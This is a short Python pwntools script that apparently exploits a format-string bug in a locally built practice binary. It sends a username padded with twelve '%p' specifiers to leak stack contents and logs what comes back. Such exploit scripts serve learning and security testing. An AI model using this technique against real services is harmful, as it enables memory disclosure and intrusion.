#!/usr/bin/python
from pwn import *


context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = 'build/format_string_debug'

binary = ELF(binary_path)


p = process(binary_path)
#p = gdb.debug([binary_path])

p.recvline('Enter username:')
payload = 'admin'
payload += '%p'*12

#
# Send the payload to the vulnerable program
p.sendline(payload)
p.recvline('Enter password:')

payload = 'aaaaaaa'
p.sendline(payload)
log.info(f"Received stack content: {p.clean()}")

p.close()
